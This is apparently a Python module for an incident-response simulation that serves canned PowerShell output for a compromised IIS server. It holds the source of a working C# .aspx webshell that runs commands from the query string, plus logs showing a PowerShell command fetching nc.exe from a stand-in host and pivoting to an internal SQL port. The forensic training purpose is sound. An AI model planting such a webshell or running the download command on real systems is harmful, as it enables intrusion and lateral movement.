"""Windows Server 2019 / IIS 10 device data + grammar for IIS-WEB-01.

Backdrop: a public-facing ASP.NET app accepted file uploads
without content validation. Attacker dropped a small .aspx
webshell under the upload path and used it to spawn REDACTED via
w3wp's worker process, enumerate the host, and pivot to an
internal MSSQL service.
"""

from __future__ import annotations

import sys

HOSTNAME = "IIS-WEB-01"

BANNER = """Microsoft Windows [Version 10.0.17763.4974]
(c) Microsoft Corporation. All rights reserved.

"""

AUTH_BANNER = ""
AUTH_USERNAME_PROMPT = "User name: "
AUTH_PASSWORD_PROMPT = "Password: "

PROMPT_SUFFIXES = {"user": "> "}


def PROMPT_FORMAT(host, mode, suffix):
    return f"PS C:\\Users\\Administrator{suffix}"


GET_IIS_ACCESS_LOG = """#Software: Microsoft Internet Information Services 10.0
#Fields: date time c-ip cs-method cs-uri-stem cs-uri-query sc-status cs(User-Agent)
2026-05-17 11:02:14 REDACTED POST /upload/profile-photo.aspx       ""                              200 "Mozilla/5.0"
2026-05-17 11:02:18 REDACTED GET  REDACTED  "?cmd=whoami"                   200 "curl/8.4"
2026-05-17 11:02:24 REDACTED GET  REDACTED  "?cmd=ipconfig+/all"            200 "curl/8.4"
2026-05-17 11:03:01 REDACTED GET  REDACTED  "?cmd=net+user"                 200 "curl/8.4"
2026-05-17 11:03:48 REDACTED GET  REDACTED  "?cmd=net+view+%5C%5C10.10.0.50" 200 "curl/8.4"
2026-05-17 11:04:21 REDACTED GET  REDACTED  "?cmd=powershell+-c+%22Invoke-WebRequest+-Uri+http%3A%2F%2Fstager.example%2Fnc.exe+-OutFile+%25TEMP%25%5Cnc.exe%22" 200 "curl/8.4"
2026-05-17 11:05:42 REDACTED GET  REDACTED  "?cmd=%25TEMP%25%5Cnc.exe+REDACTED+1433" 200 "curl/8.4"
"""

GET_WINEVENT_SECURITY = """ProviderName: Microsoft-Windows-REDACTED-Auditing

TimeCreated                Id  Message
-----------                --  -------
2026-05-17 11:02:18.121   4688 New process. NewProcessName: C:\\Windows\\System32\\REDACTED; CommandLine: REDACTED /c whoami; CreatorProcessName: C:\\Windows\\System32\\inetsrv\\REDACTED; SubjectUserName: IIS APPPOOL\\DefaultAppPool
2026-05-17 11:02:24.402   4688 New process. NewProcessName: C:\\Windows\\System32\\REDACTED; CommandLine: REDACTED /c ipconfig /all; CreatorProcessName: REDACTED; SubjectUserName: IIS APPPOOL\\DefaultAppPool
2026-05-17 11:04:21.811   4688 New process. NewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; CommandLine: powershell -c "Invoke-WebRequest -Uri http://stager.example/nc.exe -OutFile %TEMP%\\nc.exe"; CreatorProcessName: REDACTED
2026-05-17 11:05:42.117   4688 New process. NewProcessName: C:\\Users\\DefaultAppPool\\AppData\\Local\\Temp\\nc.exe; CommandLine: nc.exe REDACTED 1433; CreatorProcessName: REDACTED
"""

GET_PROCESS = """Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  ProcessName
-------  ------    -----      -----     ------     --  -----------
    411      18    25340       7212       2.41    412  explorer
    832      24    18244       5912       1.18    524  svchost
    412      24    65244      27244      11.18   2104  w3wp
    188      11     2884       1632       0.04   8041  nc
"""

GET_NETTCPCONNECTION = """LocalAddress LocalPort RemoteAddress    RemotePort State        OwningProcess
------------ --------- -------------    ---------- -----        -------------
192.0.2.20    443      0.0.0.0          0          Listen       2104
192.0.2.20    80       0.0.0.0          0          Listen       2104
10.10.0.80   52144     REDACTED      1433       Established  8041
"""

GET_CHILDITEM_UPLOADS = """    Directory: C:\\inetpub\\wwwroot\\app\\uploads\\avatars

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           4/30/2026  1:42 PM           2412 avatar_01.jpg
-a---           5/02/2026 11:08 AM           1844 avatar_02.png
-a---           5/02/2026 12:11 PM           1124 avatar_03.png
... 14 more legitimate images elided ...
-a---           5/17/2026 11:02 AM            412 avatar_18.aspx
"""

CAT_AVATAR_18_ASPX = """<%@ Page Language="C#" %>
<%
  string cmd = Request.QueryString["cmd"];
  if (cmd != null) {
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "REDACTED";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
  }
%>
"""


def _iis_log(s, a): return GET_IIS_ACCESS_LOG
def _security(s, a): return GET_WINEVENT_SECURITY
def _process(s, a): return GET_PROCESS
def _nettcp(s, a): return GET_NETTCPCONNECTION
def _childitem(s, a): return GET_CHILDITEM_UPLOADS
def _gc(s, a):
    args_lc = " ".join(a or []).lower()
    if "aspx" in args_lc:
        return CAT_AVATAR_18_ASPX
    return "% file not found in cache\n"


def _exit(s, a):
    print(); raise SystemExit


GRAMMAR = {
    "get-iisaccesslog": {"fn": _iis_log},
    "get-winevent": {"fn": _security},
    "get-eventlog": {"fn": _security},
    "get-process": {"fn": _process},
    "get-nettcpconnection": {"fn": _nettcp},
    "get-childitem": {"fn": _childitem},
    "dir": {"fn": _childitem},
    "ls": {"fn": _childitem},
    "get-content": {"fn": _gc},
    "cat": {"fn": _gc},
    "type": {"fn": _gc},
    "exit": {"fn": _exit},
    "quit": {"fn": _exit},
}
